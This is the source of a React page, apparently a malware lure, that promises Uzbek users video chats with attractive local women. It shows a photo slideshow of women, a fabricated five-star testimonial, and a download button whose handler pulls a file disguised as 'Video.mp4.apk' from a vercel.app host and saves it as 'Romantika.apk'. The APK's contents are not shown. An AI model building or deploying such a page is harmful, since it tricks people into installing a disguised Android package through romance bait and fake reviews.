import React, { useState, useEffect } from 'react';

export default function App() {
  const [currentSlide, setCurrentSlide] = useState(0);

  // Список 11 изображений (все с узбекской/азиатской внешностью)
  const images = [
    '/img/girl/0c7ee9546d69ad240a4e944011998ea4.jpg',
    '/img/girl/4faef5daad2b2c52a098c7ea3953c3a7.jpg',
    '/img/girl/5fb67a057ad47ec7ae173e2e96f81a2a.jpg',
    '/img/girl/725c42c2a53f9a2f190e7ec46189ee1d.jpg',
    '/img/girl/5982ab0ef9b6389a0e24048349abc996.jpg',
    '/img/girl/e649d44ef6bada40e456ea8afb266434.jpg',
    '/img/girl/ed4618afa15544612b46f23005e856fe.jpg',
    '/img/girl/f00bcfe0547b96d50acefff7b5ee246f.jpg',
    '/img/girl/f00bcfe0547b96d50acefff7b5ee246f2.jpg',
    '/img/girl/f00bcfe0547b96d50acefff7b5ee246f3.jpg',
    '/img/girl/f00bcfe0547b96d50acefff7b5ee246f4.jpg',

  ];

  // Автоматическая смена слайдов каждые 3 секунды
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % images.length);
    }, 3000);
    return () => clearInterval(interval);
  }, [images.length]);

  const handleDownload = (e) => {
    e.preventDefault();
    const link = document.createElement('a');
    link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
    link.download = 'Romantika.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div
      style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #ffafbd 0%, #ffc3a0 100%)',
        fontFamily: 'Segoe UI, system-ui, sans-serif',
        color: '#000',
        padding: '20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        textAlign: 'center',
        position: 'relative',
        overflowX: 'hidden'
      }}
    >
      {/* Флаг */}
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/8/84/Flag_of_Uzbekistan.svg"
        alt="O'zbekiston bayrog'i"
        style={{
          height: '32px',
          marginBottom: '14px',
          borderRadius: '3px',
          border: '1px solid rgba(0,0,0,0.3)'
        }}
      />

      {/* Заголовок */}
      <h1 style={{
        fontSize: '30px',
        fontWeight: '800',
        lineHeight: 1.2,
        marginBottom: '4px',
        color: '#c2185b',
        textShadow: '0 2px 4px rgba(0,0,0,0.1)'
      }}>
        🎥 Videolaym bilan suhbat!
      </h1>
      <h2 style={{
        fontSize: '22px',
        fontWeight: '700',
        marginBottom: '20px',
        color: '#333',
        maxWidth: '420px'
      }}>
        Eng chiroyli qizlarni <span style={{ color: '#d81b60', fontWeight: '800' }}>sizning tumaningizdan</span> toping!
      </h2>

      {/* Слайд-шоу */}
      <div style={{
        position: 'relative',
        width: '280px',
        height: '280px',
        marginBottom: '22px',
        borderRadius: '20px',
        overflow: 'hidden',
        boxShadow: '0 10px 30px rgba(0,0,0,0.25)',
        border: '3px solid #ffeb3b'
      }}>
        {images.map((src, index) => (
          <img
            key={index}
            src={src}
            alt={`Qiz ${index + 1}`}
            style={{
              position: 'absolute',
              top: 0,
              left: 0,
              width: '100%',
              height: '100%',
              objectFit: 'cover',
              opacity: index === currentSlide ? 1 : 0,
              transition: 'opacity 0.8s ease-in-out',
              borderRadius: '17px'
            }}
          />
        ))}
        {/* Индикаторы */}
        <div style={{
          position: 'absolute',
          bottom: '12px',
          left: '50%',
          transform: 'translateX(-50%)',
          display: 'flex',
          gap: '6px'
        }}>
          {images.map((_, i) => (
            <div
              key={i}
              style={{
                width: '8px',
                height: '8px',
                borderRadius: '50%',
                backgroundColor: i === currentSlide ? '#ffeb3b' : 'rgba(255,255,255,0.6)',
                transition: 'background 0.3s'
              }}
            />
          ))}
        </div>
      </div>

      {/* Подзаголовок */}
      <p style={{
        fontSize: '16px',
        color: '#444',
        marginBottom: '20px',
        maxWidth: '400px',
        lineHeight: 1.4
      }}>
        💬 Sizning ko‘changizdagi eng glamurli qiz — hozir onlayn! Faqat ilovani yuklab oling…
      </p>

      {/* Преимущества */}
      <div style={{
        display: 'flex',
        flexWrap: 'wrap',
        justifyContent: 'center',
        gap: '12px',
        marginBottom: '24px'
      }}>
        {['📍 Tuman bo‘yicha', '🎥 Haqiqiy video', '❤️ Bepul boshlash'].map((item, i) => (
          <div key={i} style={{
            background: 'white',
            padding: '9px 16px',
            borderRadius: '14px',
            fontSize: '0.95rem',
            fontWeight: '700',
            boxShadow: '0 3px 8px rgba(0,0,0,0.12)',
            color: '#d81b60'
          }}>
            {item}
          </div>
        ))}
      </div>

      {/* Кнопка */}
      <button
        onClick={handleDownload}
        style={{
          background: 'linear-gradient(135deg, #e91e63, #f50057)',
          color: 'white',
          border: 'none',
          padding: '15px 40px',
          fontSize: '19px',
          fontWeight: 'bold',
          borderRadius: '50px',
          cursor: 'pointer',
          boxShadow: '0 6px 22px rgba(233, 30, 99, 0.5)',
          transition: 'all 0.3s ease',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          gap: '10px',
          marginBottom: '22px',
          width: '94%',
          maxWidth: '360px'
        }}
        onMouseOver={(e) => {
          e.target.style.transform = 'scale(1.03)';
          e.target.style.boxShadow = '0 8px 28px rgba(233, 30, 99, 0.65)';
        }}
        onMouseOut={(e) => {
          e.target.style.transform = 'scale(1)';
          e.target.style.boxShadow = '0 6px 22px rgba(233, 30, 99, 0.5)';
        }}
      >
        📲 Ilovani bepul yuklab olish
      </button>

      {/* Отзыв */}
      <div style={{
        background: 'white',
        padding: '18px',
        borderRadius: '16px',
        width: '100%',
        maxWidth: '380px',
        boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
        border: '1px solid #ffe0e6'
      }}>
        <div style={{ color: '#f50057', marginBottom: '6px', fontSize: '18px' }}>★★★★★</div>
        <p style={{ fontSize: '14px', marginBottom: '6px', fontStyle: 'italic', color: '#333' }}>
          “Qo‘shnim — Chiroyli qiz! 10 daqiqada tanishdik. Hozir do‘stman!”
        </p>
        <p style={{ fontSize: '13px', fontWeight: 'bold', color: '#d81b60' }}>
          — Jamshid, Yunusobod
        </p>
      </div>

    </div>
  );
}